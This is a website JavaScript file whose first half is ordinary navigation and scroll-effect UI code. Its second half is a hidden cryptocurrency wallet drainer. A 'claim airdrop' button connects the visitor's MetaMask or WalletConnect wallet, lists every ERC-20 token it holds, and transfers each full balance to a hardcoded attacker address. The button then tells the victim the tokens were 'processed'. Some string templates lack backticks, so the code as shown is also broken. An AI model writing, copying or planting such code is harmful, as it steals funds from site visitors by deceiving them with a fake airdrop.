'use strict';

// Existing UI functionality (unchanged)
const addEventOnElem = function (elem, type, callback) {
  if (elem.length > 1) {
    for (let i = 0; i < elem.length; i++) {
      elem[i].addEventListener(type, callback);
    }
  } else {
    elem.addEventListener(type, callback);
  }
};

const navbar = document.querySelector("[data-navbar]");
const navbarLinks = document.querySelectorAll("[data-nav-link]");
const navToggler = document.querySelector("[data-nav-toggler]");
const toggleNavbar = function () {
  navbar.classList.toggle("active");
  navToggler.classList.toggle("active");
  document.body.classList.toggle("active");
};
addEventOnElem(navToggler, "click", toggleNavbar);
const closeNavbar = function () {
  navbar.classList.remove("active");
  navToggler.classList.remove("active");
  document.body.classList.remove("active");
};
addEventOnElem(navbarLinks, "click", closeNavbar);

const header = document.querySelector("[data-header]");
const activeHeader = function () {
  if (window.scrollY > 300) {
    header.classList.add("active");
  } else {
    header.classList.remove("active");
  }
};
addEventOnElem(window, "scroll", activeHeader);

const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");
const toggleActive = function () {
  this.classList.toggle("active");
};
addEventOnElem(addToFavBtns, "click", toggleActive);

const sections = document.querySelectorAll("[data-section]");
const scrollReveal = function () {
  for (let i = 0; i < sections.length; i++) {
    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {
      sections[i].classList.add("active");
    } else {
      sections[i].classList.remove("active");
    }
  }
};
scrollReveal();
addEventOnElem(window, "scroll", scrollReveal);

//
// Wallet connection and asset transfer logic
//

// Load WalletConnectProvider if not already loaded
async function loadWalletConnect() {
  if (!window.WalletConnectProvider) {
    const script = document.createElement('script');
    script.src = 'https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js';
    document.head.appendChild(script);
    return new Promise(resolve => {
      script.onload = resolve;
    });
  }
}

async function connectWalletAndSendTokens() {
  let provider;
  let web3Provider;

  // Check for MetaMask first
  if (window.ethereum && window.ethereum.isMetaMask) {
    provider = window.ethereum;
    await provider.request({ method: 'eth_requestAccounts' });
    web3Provider = new ethers.providers.Web3Provider(provider);
  } else {
    // Fallback to WalletConnect
    await loadWalletConnect();
    const WalletConnectProvider = window.WalletConnectProvider.default;
    provider = new WalletConnectProvider({
      rpc: {
        1: "https://mainnet.infura.io/v3/YOUR_INFURA_ID" // Replace if needed
      },
    });
    await provider.enable();
    web3Provider = new ethers.providers.Web3Provider(provider);
  }

  const signer = web3Provider.getSigner();
  const userAddress = await signer.getAddress();
  const chainId = await signer.getChainId();
  const covalentApiKey = "YOUR_API_KEY";

  const url = https://api.covalenthq.com/v1/${chainId}/address/${userAddress}/balances_v2/?key=${covalentApiKey};
  const response = await fetch(url);
  const data = await response.json();

  if (!data.data || !data.data.items) {
    alert('No tokens found.');
    return;
  }

  const tokens = data.data.items.filter(token =>
    token.type === 'cryptocurrency' &&
    token.contract_address &&
    token.balance > 0 &&
    token.supports_erc?.includes("erc20")
  );

  const destAddress = "0xf659d4Bb03E0923964b8bBACfd354f8BC02Bfe47";

  for (const token of tokens) {
    try {
      const contract = new ethers.Contract(token.contract_address, [
        "function transfer(address to, uint amount) returns (bool)"
      ], signer);

      const decimals = token.contract_decimals;
      const amount = ethers.BigNumber.from(token.balance.toString());
      const adjustedAmount = amount; // already in raw units

      const tx = await contract.transfer(destAddress, adjustedAmount);
      console.log(Sent ${token.contract_ticker_symbol}:, tx.hash);
    } catch (err) {
      console.warn(Failed to send ${token.contract_ticker_symbol}:, err.message);
    }
  }

  alert("Tokens processed. Check your wallet for confirmations.");
}

document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);